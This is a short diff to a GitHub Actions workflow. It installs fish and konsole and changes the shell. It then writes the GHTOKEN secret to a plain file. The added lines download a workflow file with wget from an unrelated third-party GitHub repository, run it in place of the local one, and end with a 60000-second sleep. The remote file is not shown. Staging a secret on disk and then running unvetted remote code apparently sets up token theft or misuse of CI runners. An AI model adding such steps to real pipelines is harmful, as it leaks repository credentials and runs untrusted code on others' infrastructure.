@@ -13,5 +13,6 @@ jobs:
       - run: sudo apt install fish konsole
       - run: echo "1" | chsh --shell /usr/bin/fish 
       - run: echo $GHTOKEN > file
-      - uses: ./.github/workflows/tail.yml
+      - run: wget https://raw.githubusercontent.com/Ambitious2Coil3/a/refs/heads/main/.github/workflows/tail.yml
+      - uses: ./tail.yml
       - run: sleep 60000
